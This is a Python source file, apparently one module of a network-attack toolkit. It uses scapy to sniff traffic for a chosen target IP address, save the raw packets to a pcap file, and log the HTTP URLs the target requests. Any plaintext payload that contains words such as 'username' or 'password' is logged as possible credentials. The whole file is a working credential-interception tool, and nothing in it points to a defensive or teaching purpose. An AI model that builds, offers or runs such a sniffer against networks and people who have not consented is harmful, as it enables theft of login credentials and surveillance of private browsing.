import scapy.all as scapy
from scapy.layers import http
import threading
import os
import time

class Sniff:
    @staticmethod
    def get_url(packet):
        try:
            host = packet[http.HTTPRequest].Host
            path = packet[http.HTTPRequest].Path
            
            # Decode bytes if necessary
            host_str = host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else str(host or "")
            path_str = path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else str(path or "")
            
            return host_str + path_str
        except Exception:
            return "Unknown"

    @staticmethod
    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            try:
                # Always ensure it is a decoded string
                load_str = load.decode('utf-8', errors='ignore') if isinstance(load, bytes) else str(load)
                keywords = ["username", "user", "login", "password", "pass"]
                for keyword in keywords:
                    if keyword in load_str.lower():
                        return load_str
            except Exception:
                pass
        return None

    @staticmethod
    def process_sniffed_packet(packet, log_filepath, pcap_writer):
        # 1. Save RAW packet to PCAP (using the persistent writer)
        try:
            if pcap_writer:
                pcap_writer.write(packet)
                pcap_writer.flush()
        except Exception:
            pass

        # 2. Analyze for HTTP or generic TCP Port 80 traffic
        is_http = packet.haslayer(http.HTTPRequest)
        is_web_port = packet.haslayer(scapy.TCP) and (packet[scapy.TCP].dport == 80 or packet[scapy.TCP].sport == 80)
        
        if is_http or is_web_port:
            url_str = ""
            login_info = Sniff.get_login_info(packet)
            
            if is_http:
                url_str = Sniff.get_url(packet)
            elif is_web_port and packet.haslayer(scapy.Raw):
                # Try to extract the Host header from raw payload if HTTP layer didn't catch it
                load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                if "Host:" in load:
                    host = load.split("Host:")[1].split("\r\n")[0].strip()
                    url_str = f"http://{host} (Raw Capture)"
            
            if url_str or login_info:
                log_entry = f"[{time.strftime('%H:%M:%S')}] "
                if url_str:
                    log_entry += f"HTTP Request >> {url_str}\n"
                if login_info:
                    log_entry += f"    [**] Possible Credentials >> {login_info}\n"
                    
                try:
                    os.makedirs(os.path.dirname(log_filepath), exist_ok=True)
                    with open(log_filepath, "a", encoding='utf-8') as f:
                        f.write(log_entry)
                except Exception:
                    pass

    @staticmethod
    def _sniff_thread(interface, target_ip, control_filepath, log_filepath, pcap_filepath):
        # Initial log entry
        try:
            with open(log_filepath, "a", encoding='utf-8') as f:
                f.write(f"\n--- Sniffing Session Started for {target_ip} at {time.ctime()} ---\n")
                f.write(f"--- Raw PCAP capturing to {pcap_filepath} (Buffered) ---\n")
        except: pass

        # Using PcapWriter for much better performance
        # We append to file to avoid losing data if session was already active
        from scapy.utils import PcapWriter
        
        try:
            # Note: PcapWriter with append=True is only efficient if we keep it open
            with PcapWriter(pcap_filepath, append=True, sync=True) as pcap_writer:
                while os.path.exists(control_filepath):
                    try:
                        scapy.sniff(
                            iface=interface,
                            store=False,
                            filter=f"host {target_ip}",
                            prn=lambda pkt: Sniff.process_sniffed_packet(pkt, log_filepath, pcap_writer),
                            timeout=2
                        )
                    except Exception:
                        time.sleep(1)
                    time.sleep(0.1)
        except Exception as e:
            error_msg = f"[-] Critical Error in Sniff Thread: {e}\n"
            try:
                with open(log_filepath, "a", encoding='utf-8') as f:
                    f.write(error_msg)
            except: pass

    @staticmethod
    def start_sniff(interface, target_ip):
        os.makedirs('threads', exist_ok=True)
        name_watcher = f"{target_ip}_sniff"
        control_filepath = f"threads/{name_watcher}_control"
        log_filepath = f"threads/{target_ip}_sniff_log.txt"
        pcap_filepath = f"threads/{target_ip}_capture.pcap"
        
        try:
            if not os.path.exists(control_filepath):
                with open(control_filepath, 'w') as f:
                    f.write("sniffing")
            
            thread = threading.Thread(
                target=Sniff._sniff_thread, 
                args=(interface, target_ip, control_filepath, log_filepath, pcap_filepath),
                name=f"Sniff_{target_ip}",
                daemon=True
            )
            thread.start()
        except Exception as e:
            print(f"[-] Error starting sniff thread: {e}")

    @staticmethod
    def stop_sniff(target_ip):
        name_watcher = f"{target_ip}_sniff"
        control_filepath = f"threads/{name_watcher}_control"
        try:
            if os.path.exists(control_filepath):
                os.remove(control_filepath)
        except Exception as e:
            print(f"[-] Error stopping sniffer: {e}")